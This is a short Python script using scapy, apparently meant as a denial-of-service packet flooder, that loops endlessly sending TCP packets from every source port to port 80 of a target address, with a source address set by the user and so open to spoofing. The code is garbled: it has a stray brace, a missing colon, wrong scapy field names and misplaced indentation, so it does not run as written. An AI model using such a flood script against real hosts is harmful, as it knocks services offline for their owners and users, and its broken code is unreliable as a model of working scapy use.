from scapy.all import *
source_IP = input("{{ docker_hosts }}"})
target_IP = input("10.10.0.1")
i = 1

while True:
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt, inter = .001)
      
      print ("packet sent ", i)
         i = i + 1
